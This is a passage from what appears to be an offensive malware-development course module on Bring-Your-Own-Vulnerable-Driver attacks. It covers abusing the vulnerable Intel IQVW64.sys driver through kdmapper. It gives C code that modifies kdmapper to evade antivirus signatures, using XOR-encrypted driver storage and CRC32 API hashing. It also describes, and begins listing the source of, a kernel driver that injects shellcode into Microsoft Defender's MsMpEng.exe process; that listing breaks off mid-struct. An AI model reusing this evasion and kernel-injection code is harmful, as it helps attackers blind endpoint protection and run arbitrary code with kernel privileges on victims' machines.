<img width="1200px" alt="image" style="margin:auto" src="27_files/byovd-263437711-701e4758-f492-44b5-8080-c920f5742dc9.png">
<p>It's important to note that in some cases, the driver itself may not 
have vulnerabilities. Instead, it may be carrying out its intended 
function within legitimate software. However, attackers can exploit this
 functionality to perform malicious actions. This situation is 
illustrated in the <a href="https://github.com/ZeroMemoryEx/Blackout" target="_blank">Blackout</a> and <a href="https://github.com/ZeroMemoryEx/Overlord" target="_blank">Overlord</a> projects, where the implant is responsible for handling communication with the drivers, specifically <a href="https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/" target="_blank">Blackout.sys</a> and <a href="https://www.loldrivers.io/drivers/edd29861-6984-4dbe-8e7c-22e9b6cf68d0/" target="_blank">kprocesshacker.sys</a>. These drivers are then used to terminate the target user-mode process when specific flags are provided.</p>
<h3 id="toc-heading-4">Exploiting CVE-2015-2291</h3>
<p>In Intel's Network Adapter Diagnostic Driver, <code>IQVW64.sys</code>, a vulnerability was identified in versions prior to <code>1.3.1.0</code>.
 This vulnerability originated as a denial-of-service issue but had the 
potential to allow an attacker to run unauthorized code with 
kernel-level privileges. In simpler terms, if this vulnerability is 
successfully exploited, an attacker could execute their own unsigned 
driver in kernel mode. This module will not provide guidance on 
exploiting the mentioned vulnerability. Instead, it will concentrate on 
its utilization within a BYOVD attack scenario.</p>
<p>The DoS exploit, as detailed on <a href="https://www.exploit-db.com/exploits/36392" target="_blank">exploit-db</a>,
 illustrates the method by which this bug can be employed to read from 
or write to kernel memory. This is achieved through a carefully crafted <code>0x80862013</code>, <code>0x8086200B</code>, <code>0x8086200F</code>, or <code>0x80862007</code> <a href="https://learn.microsoft.com/en-us/windows/win32/devio/device-input-and-output-control-ioctl-" target="_blank">IOCTL call</a>.</p>
<p>This module will not demonstrate the DoS exploit; instead, it will 
utilize an alternative PoC exploit found in the kdmapper project 
(explained in upcoming sections).</p>
<h3 id="toc-heading-5">IOCTL</h3>
<p>Device Input and Output Control or IOCTL for short, is a type of 
operation that is used to communicate between user-mode applications and
 kernel-mode drivers, in which they are used to send commands, requests,
 or instructions from user space to kernel space and vice versa. IOCTL 
requests are made using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol" target="_blank">DeviceIoControl</a> WinAPI function, which can be seen in the aforementioned DOS exploit.</p>
<h3 id="toc-heading-6">Kdmapper</h3>
<p>Another PoC can be found in the <a href="https://github.com/TheCruZ/kdmapper" target="_blank">kdmapper</a> project, initially introduced on <a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/320049-kdmapper-manual-map-driver-using-vulnerable-driver-intel.html" target="_blank">unknowncheats.me</a>. In this PoC, the <code>0x80862007</code>
 IOCTL code is utilized to perform a kernel mode driver mapping action, 
rather than conducting a DoS attack on the vulnerable driver.</p>
<p>Discussing kdmapper's code falls outside the scope of this module. However, it's worth noting that the vulnerable driver, <code>IQVW64.sys</code>, is loaded reflectively to avoid being written to the disk. Instead, it is stored in the <a href="https://github.com/TheCruZ/kdmapper/blob/master/kdmapper/intel_driver_resource.hpp" target="_blank">intel_driver_resource.hpp</a> file. The <code>IQVW64.sys</code> driver used by kdmapper has a version of <code>1.3.0.7</code> and an MD5 hash value of <code>1898ceda3247213c084f43637ef163b3</code>. You can locate this file on <a href="https://www.loldrivers.io/" target="_blank">loldrivers</a>,
 a website that maintains a catalog of Windows drivers frequently 
employed by threat actors to circumvent security measures, accessible <a href="https://www.loldrivers.io/drivers/1d2cdef1-de44-4849-80e5-e2fa288df681/" target="_blank">here</a>.</p>
<p>Note that compiling kdmapper requires you to download the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk" target="_blank">Windows Driver Kit (WDK)</a>.</p>
<h4 id="toc-heading-7">Updating Kdmapper</h4>
<p>To facilitate the execution of a successful BYOVD attack using 
Kdmapper, it becomes essential to modify certain aspects of the tool's 
code. This is particularly important given the tool's extensive public 
availability over time, making it susceptible to significant signature 
detection by security solutions. The modifications applied to the 
kdmapper project, which are shared within this module, are detailed 
below:</p>
<ul>
<li>
<p>All <code>VirtualAlloc</code> calls are replaced with <code>HeapAlloc</code> function calls. And thus, all <code>VirtualFree</code> calls were changed to <code>HeapFree</code> calls.</p>
</li>
<li>
<p>The <code>IQVW64.sys</code> driver located in the <code>intel_driver_resource.hpp</code> file is encrypted using a custom XOR encryption function. It is then stored as <code>unsigned char EncDriver</code>, as opposed to being saved as <code>static const uint8_t driver</code>.</p>
</li>
<li>
<p>Since the driver code is not a <em>static variable</em> anymore, some function definitions were changed:</p>
<ul>
<li>
<p><code>intel_driver::Unload(HANDLE device_handle)</code> was changed to <code>intel_driver::Unload(HANDLE device_handle, size_t sEncDriverSize)</code>.</p>
</li>
<li>
<p><code>intel_driver::Load()</code> was changed to <code>intel_driver::Load(unsigned char* ucEncDriver, size_t sEncDriverSize)</code>.</p>
</li>
</ul>
</li>
<li>
<p>The project uses Ntdll exported functions (<code>NtAddAtom</code>, <code>RtlAdjustPrivilege</code>, <code>NtLoadDriver</code>, and <code>NtUnloadDriver</code>) through the <code>GetModuleHandleA</code> and <code>GetProcAddress</code> WinAPIs. It's been updated to import these functions using API hashing using the <code>FARPROC GetNtdllProcAddressH(IN UINT uNtdllApiHash)</code> function.</p>
</li>
<li>
<p>Previously, kdmapper required users to provide the driver name along with command line arguments like <code>--free</code>, <code>--mdl</code>, or <code>--PassAllocationPtr</code>.
 However, it has since been updated to streamline this process. Now, a 
single argument for the unsigned driver's name suffices, and the tool 
will automatically execute with the default <code>--free</code> and <code>--mdl</code> options.</p>
</li>
</ul>
<h4 id="toc-heading-8">XOR Encryption</h4>
<p>As previously discussed, the updated kdmapper version includes an XOR-encrypted iteration of the <code>IQVW64.sys</code> driver, which can be generated through the <em>PayloadEncrypter</em> program provided alongside this module's code. <em>PayloadEncrypter</em> employs the following code for XOR encryption of an input buffer:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// 'driver' is the raw IQVW64.sys driver.</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>SIZE_T i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    driver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> driver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x85</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    driver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> driver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x2A</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    driver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> driver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x3C</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Therefore, the main function of the updated kdmapper can be observed in the following code, where it decrypts the <code>IQVW64.sys</code> driver before proceeding to execute the remainder of the exploit.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// 'EncDriver' is the XOR'd IQVW64.sys driver.</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>SIZE_T i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>EncDriver<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    EncDriver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> EncDriver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x3C</span><span class="token punctuation">;</span>
  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    EncDriver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> EncDriver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x85</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    EncDriver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> EncDriver<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x2A</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-9">IAT Hashing</h4>
<p>Furthermore, since all used APIs are exported from <code>Ntdll.dll</code>, the new kdmapper is accompanied by a function called <code>GetNtdllProcAddressH</code> that fetches function addresses from <code>Ntdll.dll</code> only. <code>GetNtdllProcAddressH</code> is shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">FARPROC	<span class="token function">GetNtdllProcAddressH</span><span class="token punctuation">(</span>IN UINT uNtdllApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PPEB                      pPeb                    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PPEB_LDR_DATA             pLdr                    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PLDR_DATA_TABLE_ENTRY     pDte                    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HMODULE                   hNtdll                  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PBYTE                     pBase                   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_NT_HEADERS         pImgNtHdrs              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_EXPORT_DIRECTORY   pImgExportDir           <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PDWORD                    pdwFunctionNameArray	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PDWORD                    pdwFunctionAddressArray <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PWORD                     pwFunctionOrdinalArray  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	DWORD                     dwImgExportDirSize      <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>


	pPeb <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB<span class="token punctuation">)</span><span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pLdr <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB_LDR_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeb<span class="token operator">-&gt;</span>Ldr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pDte <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pLdr<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Skip local exe image</span>
	pDte	<span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// Fetch Ntdll's handle</span>
	pBase <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span>hNtdll <span class="token operator">=</span> <span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span>pDte<span class="token operator">-&gt;</span>Reserved2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pBase<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBase<span class="token punctuation">)</span><span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pImgExportDir           <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	dwImgExportDirSize      <span class="token operator">=</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>Size<span class="token punctuation">;</span>
	pdwFunctionNameArray    <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pdwFunctionAddressArray <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pwFunctionOrdinalArray  <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgExportDir<span class="token operator">-&gt;</span>NumberOfFunctions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		CHAR<span class="token operator">*</span>	pFunctionName     <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pdwFunctionNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		PVOID	pFunctionAddress  <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pdwFunctionAddressArray<span class="token punctuation">[</span>pwFunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CRC32B</span><span class="token punctuation">(</span>pFunctionName<span class="token punctuation">)</span> <span class="token operator">==</span> uNtdllApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><code>GetNtdllProcAddressH</code> accepts one parameter, <code>uNtdllApiHash</code>, representing the hash of the API name to fetch its address. Hashes are generated using the following <em>Cyclic Redundancy Check</em> string hashing algorithm (CRC was implemented in Module 88).</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">UINT32 <span class="token function">CRC32B</span><span class="token punctuation">(</span>LPCSTR cString<span class="token punctuation">)</span>
<span class="token punctuation">{</span>

	UINT32		uMask 	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
			    uHash 	<span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>
	INT		    i 	    <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>cString<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		uHash <span class="token operator">=</span> uHash <span class="token operator">^</span> <span class="token punctuation">(</span>UINT32<span class="token punctuation">)</span>cString<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> ii<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			uMask <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token punctuation">(</span>uHash <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			uHash <span class="token operator">=</span> <span class="token punctuation">(</span>uHash <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">0xEDB88320</span> <span class="token operator">&amp;</span> uMask<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		i<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> <span class="token operator">~</span>uHash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">CRCHASH</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span>			<span class="token punctuation">(</span><span class="token function">CRC32B</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span>X<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t 0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtAddAtom"</span><span class="token punctuation">,</span> <span class="token string">"_CRCHASH"</span><span class="token punctuation">,</span> <span class="token function">CRCHASH</span><span class="token punctuation">(</span><span class="token string">"NtAddAtom"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t 0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"RtlAdjustPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"_CRCHASH"</span><span class="token punctuation">,</span> <span class="token function">CRCHASH</span><span class="token punctuation">(</span><span class="token string">"RtlAdjustPrivilege"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t 0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtLoadDriver"</span><span class="token punctuation">,</span> <span class="token string">"_CRCHASH"</span><span class="token punctuation">,</span> <span class="token function">CRCHASH</span><span class="token punctuation">(</span><span class="token string">"NtLoadDriver"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t 0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtUnloadDriver"</span><span class="token punctuation">,</span> <span class="token string">"_CRCHASH"</span><span class="token punctuation">,</span> <span class="token function">CRCHASH</span><span class="token punctuation">(</span><span class="token string">"NtUnloadDriver"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Now that the Kdmapper project is updated, it can evade some of the signatures from security vendors.</p>
<h3 id="toc-heading-10">Testing HelloWorld.sys</h3>
<p>Back to the original kdmapper project, the project was accompanied by a driver that prints a hello world message called <em>HelloWorld</em>, the message can be viewed from the <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/debugview" target="_blank">Debugview Sysinteral tool</a>.</p>
<p>In order for the Debugview tool to print messages from the kernel, a registry key should exist under <code>Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager</code> named <code>Debug Print Filter</code>. This key should contain a <code>DWORD</code> value named <code>DEFAULT</code> of value <code>0x00000008</code> as shown in the below image.</p>
<img width="1000px" alt="image" style="margin:auto" src="27_files/byovd-363507408-d1b02975-924a-4b76-a8e0-f4c1319d65d1.png">
<p>These changes require a system reboot to take effect. After that, open Debugview as administrator, go to <code>Capture</code>, and select <code>Capture Kernel</code>. You can disable the other capture options to reduce clutter and focus specifically on kernel-related debugging output.</p>
<img width="1000px" alt="image" style="margin:auto" src="27_files/byovd-463507694-0a6bb943-c368-4a9f-8277-f3f155865f45.png">
<p>One can now run the newly updated kdmapper project via the following command as administrator:</p>
<pre><code>kdmapper.exe HelloWorld.sys
</code></pre>
<img width="1400px" alt="image" style="margin:auto" src="27_files/byovd-563507981-42139ebf-b0b7-4e97-97d4-dc3eb0b8c2c5.png">
<p>Note that kdmapper was only successful on Windows 10, but failed on Windows 11.</p>
<h3 id="toc-heading-11">Building The Unsigned Driver</h3>
<p>Building a kernel driver is out of the scope of this course, and 
thus, is not covered in this module. However, the kernel driver shared 
with this module called <em>KernelLdr</em> will inject an encrypted shellcode to the user-mode process, <code>MsMpEng.exe</code>. This process is also known as the <em>Microsoft Malware Protection Engine</em> and it represents the core component of the Microsoft Defender AntiVirus. <em>KernelLdr</em> performs the following actions:</p>
<ul>
<li>
<p>Upon its initial loading, <code>KernelLdr.sys</code> decrypts the payload provided by the user. This encrypted payload is created using the <em>PayloadEncrypter</em> project, as shown earlier, utilizing the same XOR algorithm for simplicity.</p>
</li>
<li>
<p>KernelLdr then searches for the <code>MsMpEng.exe</code> PID using its hash. Then, it searches for an alertable thread within the target process. This is done via the <code>FetchTargetProcessAndThread</code> function.</p>
</li>
<li>
<p>It then opens a handle to the target process and maps the payload to it using the <code>ZwCreateSection</code> and <code>ZwMapViewOfSection</code> APIs, in a manner close to the user-mode remote mapping injection. Mapping the payload to the target process is done via the <code>InjectPayload</code> function.</p>
</li>
<li>
<p>After injecting the payload to <code>MsMpEng.exe</code>, KernelLdr 
executes it using APC injection, which is done differently than how 
user-mode APC injection is performed. APC injection is done via the <code>ExecuteShellcode</code> function.</p>
</li>
</ul>
<h3 id="toc-heading-12">KernelLdr Complete Code</h3>
<p>For readers who are familiar with driver development, KernelLdr's code is shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntifs.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntstrsafe.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;wdf.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DRIVER_TAG</span>                          <span class="token char">'llun'</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TARGET_PROCESS_HASH</span>		        <span class="token expression"><span class="token number">0xF70DC4CA</span>	</span><span class="token comment">// L"MsMpEng.exe"</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROCESS_VM_OPERATION</span>                <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x0008</span><span class="token punctuation">)</span>  </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROCESS_VM_READ</span>                     <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x0010</span><span class="token punctuation">)</span>  </span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PROCESS_VM_WRITE</span>                    <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x0020</span><span class="token punctuation">)</span>  </span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALERTABLE_THREAD_FLAG_OFFSET</span>        <span class="token expression"><span class="token number">0x74</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">GUI_THREAD_FLAG_OFFSET</span>              <span class="token expression"><span class="token number">0x78</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">THREAD_KERNEL_STACK_OFFSET</span>          <span class="token expression"><span class="token number">0x58</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">THREAD_CONTEXT_STACK_POINTER_OFFSET</span> <span class="token expression"><span class="token number">0x2C8</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALERTABLE_THREAD_FLAG_BIT</span>           <span class="token expression"><span class="token number">0x10</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">GUI_THREAD_FLAG_BIT</span>                 <span class="token expression"><span class="token number">0x80</span></span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>	<span class="token macro-name function">SET_TO_MULTIPLE_OF_PAGE_SIZE</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span>	    <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span> <span class="token operator">+</span> PAGE_SIZE<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>PAGE_SIZE<span class="token punctuation">)</span> <span class="token punctuation">)</span></span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHAR_BIT</span>							<span class="token expression"><span class="token number">8</span></span></span>

<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------------</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_SYSTEM_THREAD_INFORMATION</span>
<span class="token punctuation">{</span>
	LARGE_INTEGER KernelTime<span class="token punctuation">;</span>
	LARGE_INTEGER UserTime<span class="token punctuation">;</span>
	LARGE_INTEGER CreateTime<span class="token punctuation">;</span>
	ULONG WaitTime<span class="token punctuation">;</span>
	PVOID StartAddress<span class="token punctuation">;</span>
	CLIENT_ID ClientId<span class="token punctuation">;</span>
	KPRIORITY Priority<span class="token punctuation">;</span>
	LONG BasePriority<span class="token punctuation">;</span>
	ULONG ContextSwitches<span class="token punctuation">;</span>
	ULONG ThreadState<span class="token punctuation">;</span>
	KWAIT_REASON WaitReason<span class="token punctuation">;</span>
